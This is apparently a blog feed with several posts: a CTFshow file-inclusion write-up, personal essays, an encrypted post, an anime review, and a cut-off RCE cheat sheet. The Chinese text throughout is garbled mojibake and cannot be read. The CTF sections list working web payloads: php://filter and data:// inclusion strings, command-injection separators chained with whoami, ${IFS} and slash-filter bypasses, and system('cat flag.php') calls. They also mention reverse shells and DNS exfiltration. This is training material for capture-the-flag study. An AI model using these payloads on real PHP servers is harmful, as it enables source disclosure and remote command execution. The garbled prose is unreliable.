é‚£æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨PHPä¼ªåè®®å°±æ˜¯ è¿™é‡Œä½¿ç”¨çš„æ˜¯ data:&#x2F;&#x2F;text&#x2F;plain;base64,poc å…¶å®å’Œ79å·®ä¸å¤š åªæ˜¯æ³¨æ„çš„æ˜¯ç¼–ç æˆbase64çš„æ—¶å€™è¦å»æ‰ ï¼</p><h4 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h4><p>è®¿é—®ç½‘é¡µç»™äº†è§†é¢‘ï¼Œformoståˆ†è§£å‡ºæ¥æœ‰å›¾ç‰‡æ˜¯ç½‘ç«™æºç </p><p><img src="web116.png" loading="lazy"></p><p>ç„¶åç›´æ¥è®¿é—®flag.phpå°±è¡Œï¼Œè¯´å®è¯æœ‰ç‚¹æ‡µï¼Œå› ä¸ºè¿‡æ»¤æŒºç‹ çš„</p><h4 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h4><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp:&#x2F;&#x2F;filterçš„å¦™ç”¨</a></p><p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;filterçš„å„ç§è¿‡æ»¤å™¨</a></p><p>è¿™é“é¢˜è¿‡æ»¤äº†rot13ï¼Œbase64ï¼Œstringç­‰ä¸€äº›è¿‡æ»¤å™¨çš„å†…å®¹ï¼Œé‚£æ¢å…¶ä»–è¿‡æ»¤å™¨ä¸å°±å®Œäº‹äº†ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ç”¨<code>convert.iconv.*</code>è¿™ä¸ªè¿‡æ»¤å™¨ã€‚</p><p>payloadï¼š</p><blockquote><p>GET: ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.ucs-2be.ucs-2le&#x2F;resource&#x3D;a.php</p><p>ä»<code>UCS-2LE</code>ç¼–ç è½¬æ¢ä¸º<code>UCS-2BE</code>ç¼–ç </p><p>POST: contents&#x3D;?&lt;hp pvela$(G_TEâ€™[â€˜a)] ;&gt;?</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>byeSophomore</title>
      <link href="/2024/06/26/byeSophomore/"/>
      <url>/2024/06/26/byeSophomore/</url>
      
        <content type="html"><![CDATA[<p>ç«¯åˆå›æ¥çš„é‚£å¤©ä¸‹åˆä¸å°å¿ƒéª¨æŠ˜äº†ï¼Œåˆšåˆšå®Œæˆäº†è¯¾è®¾ï¼Œé™¤äº†å¼€å­¦çš„ç¼“è€ƒå¤–ï¼Œå¯¹æˆ‘æ¥è¯´ï¼Œå¤§å­¦ç”Ÿæ´»å·²ç»æ‚„ç„¶è¿‡åŠ</p><p>è¯´èµ·æ¥ä¹ŸæŒºç¢Œç¢Œæ— ä¸ºçš„ï¼Œä½†ä¹Ÿä¸è‡³äºä¸€äº‹æ— æˆï¼Œåªæ˜¯è§‰å¾—è¿˜ä¸å¤Ÿã€‚å¯¹äºæœªæ¥çš„è§„åˆ’ï¼Œå¦ç™½è¯´æˆ‘åªæƒ³è€è€å®å®ä¸Šä¸ªç­èµšé’±ï¼Œå¤§å®¶éƒ½æƒ³èµšå¾—å¤šï¼Œå› ä¸ºè¿™æ ·æ‰æœ‰èµ„æ ¼èµå›å±äºè‡ªå·±çš„ä¸€ç‚¹è‡ªç”±ï¼Œä½†ä¹ŸæŒºè¿·èŒ«ï¼Œå› ä¸ºç¡®å®æ²¡æƒ³å¥½å…·å…·ä½“ä½“çš„æ–¹å‘ã€‚</p><blockquote><p>ç©ºè™šçš„å‹‰åŠ±å’Œæ²¹è…»çš„é¸¡æ±¤ä¸€æ ·ä»¤æˆ‘åèƒƒï¼Œå¦‚æœä¸€ä¸ªäººèƒ½è½»æ˜“åœ°é€šè¿‡å‡ å¥æ–‡å­—å¾—åˆ°åè¶³çš„åŠ¨åŠ›ï¼Œè¿™ä¸ªäººææ€•ä¹Ÿå•çº¯æ— è„‘è€Œæ˜“äºå—åˆ°åˆ©ç”¨ï¼›è€Œè¿œå¤§æ·±åˆ»çœŸæ­£æœ‰æ•ˆçš„æ¿€åŠ±ï¼Œå´æ˜¯ä¸€æ®µè¯æ— æ³•è¡¨è¾¾ã€è¡¨è¾¾åä¹Ÿæ— æ‰€è£¨ç›Šçš„ï¼šå†™å‡ºæ¥åªæ˜¯ç»™åˆ«äººçœ‹çš„è¡¨å†³å¿ƒï¼Œåˆä¸èƒ½æ·±åŒ–è¿™ä¸€æ¿€åŠ±ã€‚è¿™ä¸€ç±»çš„æ–‡å­—ï¼Œè¦ä¹ˆåªæ˜¯æµäºå½¢å¼çš„æ•·è¡ï¼Œè¦ä¹ˆå°±æ˜¯æµ…è–„çš„è¡¨éœ²ã€‚</p></blockquote><p>æ€»ä¹‹è¿˜å¾—å»åšå§ï¼Œç©ºæƒ³å€’ä¹Ÿæ²¡ä»€ä¹ˆç”¨ï¼Œæˆ‘å†™è¿™äº›ä¸œè¥¿ä¸çŸ¥é“è¦ç»™è°çœ‹ï¼Œä¹Ÿä¸çŸ¥é“è°ä¼šçœ‹åˆ°ï¼Œæˆ‘è¡¨è¾¾èƒ½åŠ›ä¸€å‘å¾ˆå¼±ï¼Œæ€»è§‰å¾—æ˜¯è¯»çš„ä¹¦å¤ªå°‘ï¼Œæ‰€ä»¥ä¹Ÿæ²¡æœ‰æƒ³ç€è‡ªå·±å†™çš„è¿™ç‚¹ä¸œè¥¿èƒ½ç»™åˆ«äººå¸¦æ¥ä»€ä¹ˆï¼Œå°±æƒ³è®°å½•ä¸€ä¸‹å§ã€‚</p><p>æƒ³äº†å¥½å¤šï¼Œè¿˜æ˜¯ç®—äº†</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯èƒ½çœŸçš„è¦ç­‰å¥½ä¹…äº†</title>
      <link href="/2024/06/17/%E8%BF%99%E4%BC%BC%E4%B9%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%97%AD%E7%8E%AF/"/>
      <url>/2024/06/17/%E8%BF%99%E4%BC%BC%E4%B9%8E%E6%98%AF%E4%B8%80%E4%B8%AA%E9%97%AD%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="e522772ea704707720a4ef0bc557a013923c8e9594f20e1e414419ebbbe9f8c7">6b09021c4fad842555217a8d07b3963feb852d3e21f8742f65fcd76a470d0bd132968d4640d394f9980075d76c1e54c55906bfeeb9d4b19a98ae91997175b4116f505795b7b910c3386a65db4722adc0cc05a4478c6a9bd4bc6e5b8233db3a139e6d31da6c7ea1cbea42884836829b6c085f5664568bc6ea1c32e141417bb618db4bb820f58414f39ada0f9301699f332f2d8ba91c4d9f00f587dfdd8cc25a9e1ba7e869aab6ca7897472cceec9c42aa5653556e963006430dd7ae93240198851e4c49c871bc97ab7c376e51e2a240f54137f454c6298e4c6cbc9ce8f28b83e42547ae361e88c61836a6f71400a33085d0aca6fa807d8e11bbf2dcd6962b286af488105934d22a04e9f2e0d96ebe14597baa789a4753c60d6d2737814d39d02a94c010763760ed4ab4d9c98a3ef4da26e48bae060cfd1a357e3f3f740da5b486e0604b5ad6ed6762c499a7ea8b843448c893679f123443b4998bde3cf7fd4145b6cef62f81d7d93737020320b0e23541555e880fea8707bb86efc5eb301b980d68362000fba23912338cfbc222360f316c5b26a09297697f0b442300a185fc224540ed14d4f6b9b56c2c90f2ccf70875ec7d2f03aa2b1cc2c4d1f01772d14154ffa797f4247e153da0f8b87550482fc337a7e7b2701c4e7180282ec6fc05cb25c71bfe2b3ca63a95e6bfa153832774b1da60405909979bbdadaccd13874f3d3bbc1506612118e8111ac08adfb6f4944da15f0d93e3e18cf22f942eef8640a5e921f340c074d93efa9ce303824ea2c2173c750b03d0ca025bdde24e3287f71e083c4dc81abfd7fd51f91600d50ca94a76a778bb4fd5f71fd66cd3f639ff2e4a4331ff5fc177482301680bb501c3aa8b25b079ed9a63752ed5abf85e1fdf4ae54fc04acac0e54b928cc7eb39fc987a11bba9050655b470f3fb2a159deea5e1ca7d573acce7c7f4a5250bc3249e4487c73f7a8ed7067d3dd09e6871dd0d448ed358c388430538ad145d5cfaaa472a7b7553d73281fa7aad8037dfdeb00aa2f53b3bb83b1fdfdb7a99749d58f2ce97369c95ab5561e7406501a9463e9f74f293dae82484bf02cd92e0ca53a6e307bcd513d26069177efad396a4628d4eeeb9c642d5211abc1ac9cd63eb1c6b3e1aef02390bf3e1dbc531fd2d3850f5a6397759de2bf295fd9068a3b7afb5cd1ff3f910e80d6c5ab4812c64688e7c9694b721c7e5c1ab547a11eafbbb71b30899639877c2b10719dcdf3ac1f215ea733cebacab4f4d019c6efbc82d4e474c076d65fc3c063e055be71425c0dcab0d48e1da8cb659adecb2ec4489fc0aa71d71613ffd694955df279aca61fd267d4ae1be23e399c0dca1df15aa793a02997fbeb87cc019e1bab7b78ea55e14783ad10f9b9508eb44314c89aac04aac3ae7f06e7b0897c5b79ed5829c064fa10e5db82d616ab1e9d82e253dc99d0bb8b3f868a0ba6f583f46335a49923edaf0c629c2fd85e87425fa40e6ad7f72a5174bc640dded86cad62e17cf2f75dde1c4e1519a30da2dd7dafc129992eaf346da628941bfe2404dc1471fde14548edf1fa018774df7f99c8f9094b05c7767b77cbc019ab4ab4d195afa0a50b0bc5063c3b6343a157d63ab54e10d084c861e2015e47e68ffda2d10cc0b79298b8f4a7c4b9d046ec861a32246220f1b46489b762a85f1d7d1f6488424d89b80d43f312f2b84232b0bcaced24921db52222da9ece94827544c8dfecf8790186634a966ec60c48fb5e0b7ee49b1ec97e5780c9a1497a3264a912483377f3a6cff979a0cf358c6d807627f1b490a41819be1e5ebfd4945c7d494b7f68eac8f8aeeae61697c3aaad07326063dd7a84b9b35f3c1fe2599ecd6c4080e3cc6e456555c68b10069f9dc4aa73c204b18290c2d9a7f4b28ef9acfa4bca8fa735f76da9f02cacb54913fd480204f5f33c2b636008571647a7e5d1d1ed8631fce3e9a5709260cb0c829586b556c5d175a6d2a72e6351d8ff252febae745c979657e7d276bc23ff0ab34a5f22445af1127d283e71ca7b3a84761334dc1d408944f66dea2647ab335cb1bb70da8143ce73711d8c77d59a29b14d42be38386f94ea7e2ee82cbfc155fae65db97f537970539391d0da75435d3b28c0b4dc7fc2cd732ccc48b024d9b87c605de90e0b7ef38e55195100a547d826cfa7159597a823577ce716ef8919ac4297a312bcb0c073b3146c3d66952756fb43cb4b37614dd0545f2ae17319a33fc1cf3fd3574b7c1cc3f04f76d93ac7aa564e3e6be54d8eaf86b784a48cbcf4420fb24692206291e3ce9a6bfac560c6c87473d68d778f792e8ced1f58c30c9f4b5d0542736606ed396f509a5810a4d20be921ab88e3c3c244bbb52a48fa92b33bdd4d9e69bfc7a875e46c6afc3f9312997af870cc69b9d81e3b0ac691c1afbbbc6c920729ebdacbdc487caf18a1a247768909f0cad6074b695cd9bcd7c3cae0c5aea4fc39c15c119bb893afefdcc703c8add147c7eb886b3197fb570e2472d07302d14fb13ee4e834d07f689c1082925bbb3d3d22bda707719c939c364faf76794a2656322958e904460a9f0b43090dcfb60a6ae7e9555916b662aadda62fbb96e70a8a16436ae100788e1cca5e9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Maybe have a guess</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¢ç¢å¿µ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CyberPunk</title>
      <link href="/2024/06/05/CyberPunk/"/>
      <url>/2024/06/05/CyberPunk/</url>
      
        <content type="html"><![CDATA[<p><img src="1.png" alt="CyberPunk" loading="lazy"></p><p><img src="2.png" loading="lazy"><em>Lucyå¸¦Davidç¬¬ä¸€æ¬¡æ¥æœˆçƒ</em></p><p>ä¹‹å‰æœ‰å¾ˆå¤šæœ‹å‹å®‰åˆ©è¿‡ï¼Œçœ‹åˆ°å¾ˆå¤šåŒå­¦å–œæ¬¢è¿™ä¸ªåŠ¨æ¼«ï¼Œçœ‹å®Œåä¸å‡ºæ„æ–™çš„éå¸¸å¥½çœ‹ </p><p>æœ€æ‰“åŠ¨æˆ‘çš„å½“ç„¶æ˜¯Lucyå’ŒDavidï¼ŒDavidä»ç¬¬ä¸€æ¬¡è¢«Lucyå¸¦è¿›æœˆçƒï¼Œå°±ä¸€ç›´è®°å¾—Lucyæœ€æƒ³å»æœˆçƒäº†ï¼ŒLucyä¸ºäº†ä¿æŠ¤Davidä¸€ç›´åœ¨ä¸é¡¾å±é™©çš„é»˜é»˜çš„ä»˜å‡ºï¼Œå°½ç®¡æœ€åå¹¶ä¸æ˜¯å®Œç¾çš„ç»“å±€ï¼Œä¸è¿‡æ„ŸåŠ¨æˆ‘çš„æ˜¯ä»–ä»¬å­˜åœ¨äºç»†ææœ«èŠ‚çš„æ¸©æŸ”ã€‚</p><p>å½“ç„¶ï¼Œä¸æ­¢ä»–ä»¬ï¼Œè¿˜æœ‰å¾ˆå¤šä»¤äººéš¾å¿˜çš„è§’è‰²å’Œå‡ºè‰²ç‹¬ç‰¹èƒŒæ™¯è®¾å®šã€‚</p><p>åœ¨å¤§å¤šæ•°ç§‘æŠ€è¢«é¡¶å±‚å„æ–­çš„æ—¶å€™ï¼Œæ¯ä¸ªäººéƒ½ç”Ÿæ´»åœ¨ç›‘æ§ä¹‹ä¸‹ï¼Œä»–ä»¬æ˜¯ä¸€ç¾¤æ¸¸ç¦»åœ¨ç¤¾ä¼šåº•å±‚å’ŒåŸå¸‚è¾¹ç¼˜çš„<em><strong>èµ›åšæœ‹å…‹</strong></em>ï¼Œä»–ä»¬çš„æ¢¦æƒ³å¯èƒ½æ˜¯è‡ªç”±å§ï¼Œä¸è¿‡æ¸´æ±‚è‡ªç”±ä¼¼ä¹å¤ªè¿‡å¥¢æœ›ï¼Œä¸è¿‡ä»–ä»¬ä»¥åŠå¾ˆå¤šä¼™ä¼´éƒ½æœ‰ç€å±äºCyberpunkçš„æµªæ¼«</p><p>åŠ¨æ¼«ä¸­çš„Bgmä¹ŸåŒæ ·å¥½å¬ï¼š<em>I Really Want to Stay at Your House</em></p><p><strong>ä¸€äº›å£çº¸â†“â†“â†“</strong></p><p><img src="3.png" alt="Lucy" loading="lazy"></p><p><img src="4.png" alt="Lucy" loading="lazy"></p><p><img src="5.png" alt="Lucy" loading="lazy"><em>Crazy but beautiful</em></p><p><img src="6.png" alt="Davidå’ŒLucyğŸ¥°" loading="lazy"></p><p><img src="7.png" alt="David&#39;s mom" loading="lazy"><em>Davidçš„éº»éº»ğŸ˜­</em></p><p><img src="8.png" alt="Rebecca" loading="lazy"><em>éå¸¸å¯çˆ±çš„å°å¥³å­©</em></p><p><img src="9.png" alt="Rebecca" loading="lazy"></p><p><img src="10.png" alt="Cyberpunk" loading="lazy"><em>å¤§åˆç…§</em></p><p><strong>è¿™ä¸ªä¸–ç•Œä¸Šæ²¡æœ‰ä»»ä½•äººèƒ½å®Œå…¨ä¿¡ä»»ï¼Œé™¤äº†ä½ è‡ªå·±ã€‚</strong></p><p><img src="14.png" alt="David" loading="lazy"></p><p><strong>å¯¹ä¸èµ·ï¼Œæˆ‘ä»¬ä¸èƒ½ä¸€èµ·ä¸Šæœˆçƒäº†ã€‚</strong></p><p><img src="11.png" loading="lazy"><em>Davidçš„é—è¨€ğŸ˜­ğŸ˜­ğŸ˜­</em></p><p><strong>èµ›åšæœ‹å…‹ä¸éƒ½æ˜¯åœ¨é€ƒé¿æŸç§å¯è€»äººç”Ÿçš„é€ƒéš¾è€…ï¼Œæˆ–æ˜¯æŠ±ç€é¥è¿œå¿—å‘è€Œè¿·å¤±è‡ªæˆ‘çš„é€æ¢¦è€…å— ï¼Ÿ</strong></p><p><img src="12.png" alt="Kiwi" loading="lazy"><em>é…·é…·çš„kiwi</em></p><p><strong>å›é¡¾è¿‡å»æ²¡æœ‰æ„ä¹‰ã€‚</strong></p><p><img src="13.png" alt="David" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Anime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-rce</title>
      <link href="/2024/06/03/web%E5%85%A5%E9%97%A8-rce/"/>
      <url>/2024/06/03/web%E5%85%A5%E9%97%A8-rce/</url>
      
        <content type="html"><![CDATA[<h3 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h3><h4 id="ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å¸¸è§å§¿åŠ¿"><a href="#ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å¸¸è§å§¿åŠ¿" class="headerlink" title="ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å¸¸è§å§¿åŠ¿"></a>ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å¸¸è§å§¿åŠ¿</h4><p>system</p><p>exec</p><p>passthru</p><p>shell_exec</p><p>include(æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œé…åˆphpä¼ªåè®®)</p><h4 id="ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹å¼"><a href="#ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹å¼" class="headerlink" title="ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹å¼"></a>ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹å¼</h4><h5 id="Windowsæ”¯æŒï¼š"><a href="#Windowsæ”¯æŒï¼š" class="headerlink" title="Windowsæ”¯æŒï¼š"></a>Windowsæ”¯æŒï¼š</h5><p>|ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ ping 127.0.0.1|whoami<br>||å‰é¢å‡ºé”™æ‰§è¡Œåé¢çš„ ï¼Œå‰é¢ä¸ºå‡ ping 2||whoami<br>&amp; å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„,å‰é¢å¯çœŸå¯å‡ ping 127.0.0.1&amp;whoami<br>&amp;&amp;å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ ping 127.0.0.1&amp;&amp;whoami</p><p>%0a å›è½¦</p><p>%1a ä½œä¸º.batæ–‡ä»¶çš„å‘½ä»¤åˆ†éš”ç¬¦</p><h5 id="Linuxæ”¯æŒ"><a href="#Linuxæ”¯æŒ" class="headerlink" title="Linuxæ”¯æŒ:"></a>Linuxæ”¯æŒ:</h5><p>;å‰é¢çš„æ‰§è¡Œå®Œæ‰§è¡Œåé¢çš„ ping 127.0.0.1;whoami<br>|ç®¡é“ç¬¦ï¼Œæ˜¾ç¤ºåé¢çš„æ‰§è¡Œç»“æœ ping 127.0.0.1|whoami<br>||å½“å‰é¢çš„æ‰§è¡Œå‡ºé”™æ—¶æ‰§è¡Œåé¢çš„ ping 1||whoami<br>&amp; å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„,å‰é¢å¯çœŸå¯å‡ ping 127.0.0.1&amp;whoami<br>&amp;&amp;å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ ping 127.0.0.1&amp;&amp;whoami</p><p>%0a å›è½¦</p><p>%0d æ¢è¡Œ</p><h5 id="è¿‡æ»¤ç©ºæ ¼ç»•è¿‡"><a href="#è¿‡æ»¤ç©ºæ ¼ç»•è¿‡" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼ç»•è¿‡"></a>è¿‡æ»¤ç©ºæ ¼ç»•è¿‡</h5><p>ä½¿ç”¨&lt;ä»£æ›¿ç©ºæ ¼</p><p>ä½¿ç”¨${IFS}ä»£æ›¿ç©ºæ ¼</p><blockquote><p>IFSå˜é‡çš„ç›¸å…³ä¿¡æ¯ï¼š</p><ul><li>ShellæŠŠå˜é‡IFSå†…çš„æ¯ä¸€ä¸ªå­—ç¬¦éƒ½å½“åšæ˜¯ä¸€ä¸ªåˆ†å‰²ç¬¦(delimeter)ï¼Œç”¨è¿™äº›å­—ç¬¦ä½œä¸ºæ¯ä¸€ä¸ªå­—æ®µçš„ç»“æŸç¬¦æ¥è¿›è¡Œåˆ†å‰²ã€‚</li><li>å¦‚æœIFSæ²¡æœ‰è®¾ç½®ï¼Œæˆ–è€…IFSçš„å€¼è¢«è®¾ç½®ä¸ºâ€\t\nâ€(space, tabå’Œ newline)ï¼Œé‚£ä¹ˆæ“ä½œå¯¹è±¡çš„å¼€å§‹å’Œç»“æŸå¤„çš„æ‰€æœ‰space, tabå’Œnewlineåºåˆ—éƒ½å°†è¢«å¿½ç•¥ï¼Œä½†æ˜¯æ“ä½œå¯¹è±¡ä¸­é—´çš„space, tabå’Œnewlineåºåˆ—ä¼šä½œä¸ºç•Œå®šç¬¦å·¥ä½œã€‚</li><li>å¦‚æœIFSå€¼ä¸æ˜¯é»˜è®¤å€¼(ä¾‹å¦‚ç¨‹åºä¸­å¯¹IFSè¿›è¡Œè®¾ç½®è¿‡)ï¼Œåªæœ‰å‡ºç°åœ¨IFSå†…çš„ç©ºç™½å­—ç¬¦(å¯èƒ½æ˜¯space, tabæˆ–newlineä¸­çš„ä¸€ä¸ªæˆ–å‡ ä¸ª)æ‰ä¼šåœ¨å•è¯å¼€å§‹å’Œç»“æŸå¤„è¢«å¿½ç•¥ï¼Œè¿™é‡Œè¯´çš„æ˜¯å•è¯ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ“ä½œå¯¹è±¡ã€‚</li><li>IFSå†…çš„éç©ºç™½å­—ç¬¦å¤šä¸ªè¿ç»­å‡ºç°æ—¶ï¼Œæ¯ä¸ªéç©ºç™½å­—ç¬¦ä¼šè¢«å½“åšå•ç‹¬çš„åˆ†éš”ç¬¦çœ‹å¾…ï¼Œä½†æ˜¯å¤šä¸ªè¿ç»­çš„ç©ºç™½å­—ç¬¦ä¼šè¢«å½“åšä¸€ä¸ªåˆ†éš”ç¬¦çœ‹å¾…ã€‚</li><li>å¦‚æœIFSä¸ºç©º(â€œnullâ€)ï¼Œåˆ™ä¸ä¼šè¿›è¡Œå•è¯åˆ†å‰²ã€‚</li></ul></blockquote><p>ä½¿ç”¨$IFSä»£æ›¿ç©ºæ ¼</p><h5 id="è¿‡æ»¤æ–œæ -ç»•è¿‡"><a href="#è¿‡æ»¤æ–œæ -ç»•è¿‡" class="headerlink" title="è¿‡æ»¤æ–œæ &#x2F;ç»•è¿‡"></a>è¿‡æ»¤æ–œæ &#x2F;ç»•è¿‡</h5><p>ä½¿ç”¨${HOME:0:1}ä»£æ›¿</p><h5 id="phpä¼ªåè®®"><a href="#phpä¼ªåè®®" class="headerlink" title="phpä¼ªåè®®"></a>phpä¼ªåè®®</h5><p>PHP ä¼ªåè®®æ˜¯ PHP æ”¯æŒçš„åè®®ä¸å°è£…åè®®ï¼Œå‡ ä¸ª PHP æ”¯æŒçš„ä¼ªåè®®å¦‚ä¸‹ã€‚</p><table><thead><tr><th>ä¼ªåè®®</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</td></tr><tr><td>http:&#x2F;&#x2F;</td><td>è®¿é—® HTTP(s) ç½‘å€</td></tr><tr><td>php:&#x2F;&#x2F;</td><td>è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµ</td></tr><tr><td>phar:&#x2F;&#x2F;</td><td>PHP å½’æ¡£</td></tr><tr><td>zip:&#x2F;&#x2F;</td><td>å‹ç¼©æµ</td></tr></tbody></table><p>ä¾‹å¦‚åœ¨ allow_url_include &#x3D; on æ—¶æœåŠ¡å™¨ä¸Šæœ‰ä¸ªæ–‡ä»¶å« index.phpï¼Œä¸”å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè¿™ä¸ªæ—¶å€™å°±èƒ½ç”¨ php ä¼ªåè®®ç›´æ¥æŠŠæ–‡ä»¶æ˜¾ç¤ºå‡ºæ¥ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=index.php</span></code></pre><p>ç¨å¾®è§£é‡Šä¸‹è¿™ä¸ªåšæ³•ï¼Œphp:&#x2F;&#x2F;filter&#x2F; æ˜¯ä¸€ç§è®¿é—®æœ¬åœ°æ–‡ä»¶çš„åè®®ï¼Œ&#x2F;read&#x3D;convert.base64-encode&#x2F; è¡¨ç¤ºè¯»å–çš„æ–¹å¼æ˜¯ base64 ç¼–ç åï¼Œresource&#x3D;index.php è¡¨ç¤ºç›®æ ‡æ–‡ä»¶ä¸ºindex.phpã€‚é—®ä»€ä¹ˆè¦è¿›è¡Œ base64 ç¼–ç å‘¢ï¼Ÿå¦‚æœä¸è¿›è¡Œ base64 ç¼–ç ä¼ å…¥ï¼Œindex.php å°±ä¼šç›´æ¥æ‰§è¡Œï¼Œæˆ‘ä»¬å°±çœ‹ä¸åˆ°æ–‡ä»¶ä¸­çš„å†…å®¹äº†ã€‚php åè®®è¿˜å¸¸ç”¨ php:&#x2F;&#x2F;inputï¼Œè¿™å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå¯ä»¥è¯»å– POST è¯·æ±‚çš„å‚æ•°ã€‚</p><h5 id="data-ä¼ªåè®®"><a href="#data-ä¼ªåè®®" class="headerlink" title="data ä¼ªåè®®"></a>data ä¼ªåè®®</h5><p>php 5.2.0 èµ·ï¼Œæ•°æ®æµå°è£…å™¨å¼€å§‹æœ‰æ•ˆï¼Œä¸»è¦ç”¨äºæ•°æ®æµçš„è¯»å–ï¼Œå¦‚æœä¼ å…¥çš„æ•°æ®æ˜¯PHPä»£ç å°±ä¼šæ‰§è¡Œä»£ç ã€‚ä½¿ç”¨æ–¹æ³•ä¸º:</p><pre class="language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64ç¼–ç åçš„æ•°æ®)</code></pre><h5 id="æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ"><a href="#æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ"></a>æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ</h5><p>1.tee ä»æ ‡å‡†è¾“å…¥è¯»å–ï¼Œå†å†™å…¥æ ‡å‡†è¾“å‡ºå’Œæ–‡ä»¶ã€‚ Eg:  ls &#x2F; | tee 1.txt</p><p>2.åå¼¹shell</p><p>3.dnslogå¤–å¸¦</p><h5 id="ä¸‹åˆ’çº¿çš„æ­£åˆ™ç»•è¿‡"><a href="#ä¸‹åˆ’çº¿çš„æ­£åˆ™ç»•è¿‡" class="headerlink" title="ä¸‹åˆ’çº¿çš„æ­£åˆ™ç»•è¿‡"></a>ä¸‹åˆ’çº¿çš„æ­£åˆ™ç»•è¿‡</h5><p> è¿™ä¸ªæ­£åˆ™çš„ç»•è¿‡æ–¹æ³•å°±æ˜¯åˆ©ç”¨ç‰¹æ€§æ¥ç»•è¿‡ï¼Œå¯ä»¥ç”¨</p><p>ã€€[</p><p> (ç©ºæ ¼)</p><p> + ã€€</p><p> .</p><p>ä¸Šé¢é‚£å‡ ä¸ªå­—ç¬¦ä»»ä½•ä¸€ä¸ªéƒ½è¡Œï¼Œéƒ½å¯ä»¥è¢«å¤„ç†æˆ_</p><h3 id="web29-124"><a href="#web29-124" class="headerlink" title="web29-124"></a>web29-124</h3><h4 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h4><p>åªæ˜¯è¿‡æ»¤äº†ç®€å•çš„flagå­—ç¬¦ï¼Œç›´æ¥ä½¿ç”¨systemå‡½æ•°</p><p>Payload:</p><blockquote><p>1ã€ç”¨egrepæ•ˆæœä¸€æ ·egrep&#x3D;grep  -E<br>c&#x3D;system(â€œcat fl<em>g.php | grep  -E â€˜fl.gâ€™ â€œ);<br>2ã€æ­¤ç§æ–¹å¼éœ€è¦å³é”®æºä»£ç <br>c&#x3D;system(â€œcat fl</em>g.phpâ€);<br>3ã€</p><p>c&#x3D;system(â€œtac fl<em>g.phpâ€);<br>4ã€å€’åºè¾“å‡ºæ–‡æœ¬<br>c&#x3D;system(â€œtac 